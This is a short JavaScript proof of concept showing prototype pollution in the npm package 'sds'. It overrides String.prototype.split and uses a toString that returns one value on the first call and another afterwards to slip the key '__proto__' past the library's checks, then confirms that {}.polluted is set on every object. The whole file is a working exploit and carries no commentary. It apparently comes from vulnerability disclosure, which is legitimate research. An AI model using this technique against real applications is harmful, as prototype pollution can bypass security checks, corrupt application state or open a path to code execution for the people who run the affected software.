var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const root = require('sds');
obj = {};
let payload = '__proto__.polluted';
console.log({}.polluted);
root.set({}, payload, true);
console.log({}.polluted);